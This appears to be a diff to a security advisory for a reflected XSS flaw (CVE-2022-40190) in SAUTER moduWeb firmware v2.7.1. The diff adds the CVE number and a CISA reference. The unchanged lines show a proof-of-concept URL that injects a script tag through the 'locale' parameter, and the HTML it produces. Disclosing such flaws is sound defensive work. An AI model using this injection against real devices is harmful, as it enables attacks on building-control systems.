@@ -1,5 +1,5 @@
-Reflected XSS (Cross-Site Scripting) attack
--------------------------------------------
+Reflected XSS (Cross-Site Scripting) attack - CVE-2022-40190
+------------------------------------------------------------
 
 Version: SAUTER moduWeb Firmware Version: v2.7.1
 
@@ -17,3 +17,7 @@ http://IP/?locale=something"/> <script>alert("XSS by IthacaLabs")</script> <inpu
 
 Affected Code:
 <input type="hidden" name="locale" value= "something"/> <script>alert("XSS by IthacaLabs")</script> <input type="hidden" name="locale2" value="something2">
+
+
+Reference:
+https://www.cisa.gov/uscert/ics/advisories/icsa-22-300-02
